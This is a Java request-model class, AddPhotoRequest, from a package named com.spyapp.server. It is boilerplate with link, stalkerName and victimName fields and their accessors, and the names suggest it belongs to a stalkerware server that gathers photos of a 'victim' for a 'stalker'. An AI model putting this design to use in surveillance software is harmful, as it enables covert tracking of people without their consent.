/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.requestresponsemodel.request;

public class AddPhotoRequest {

    private String link;
    private String stalkerName;
    private String victimName;

    public AddPhotoRequest(String link, String stalkerName, String victimName) {
        this.link = link;
        this.stalkerName = stalkerName;
        this.victimName = victimName;
    }


    public String getLink() {
        return link;
    }

    public void setLink(String link) {
        this.link = link;
    }

    public String getStalkerName() {
        return stalkerName;
    }

    public void setStalkerName(String stalkerName) {
        this.stalkerName = stalkerName;
    }

    public String getVictimName() {
        return victimName;
    }

    public void setVictimName(String victimName) {
        this.victimName = victimName;
    }

    public AddPhotoRequest(){

    }
}
